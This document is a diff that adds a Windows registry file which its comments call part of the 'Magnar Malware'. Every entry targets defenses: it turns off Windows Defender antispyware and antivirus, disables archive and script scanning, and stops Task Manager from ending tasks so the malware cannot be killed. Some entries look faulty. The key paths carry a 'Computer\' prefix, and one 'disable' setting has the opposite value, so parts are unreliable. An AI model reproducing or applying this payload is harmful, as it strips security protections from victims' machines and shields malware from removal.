@@ -1,0 +1,26 @@
+Windows Registry Editor Version 5.00
+;; bypass windows defender processes
+;; developed by Timo Sarkar for the Magnar Malware
+;;
+;; developed for educational purposes. No mailcious intention
+;;
+;; Target wd registry to disable antispyware/virus 
+[Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender]
+"DisableAntiSpyware"=dword:1
+"DisableAntiVirus"=dword:1
+
+;; bypass the archivescanning through wd 
+[Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowArchiveScanning]
+"value"=dword:0
+
+;; pypass the script scanning for wd
+[Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowScriptScanning]
+"value"=dword:0
+
+;; disable quickscan through wd
+[Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\DisableCatchupQuickScan]
+"value"=dword:0
+
+;; disable taskkill through possible auto-kill features in win32
+[Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\TaskManager\AllowEndTask]
+"value"=dword:0
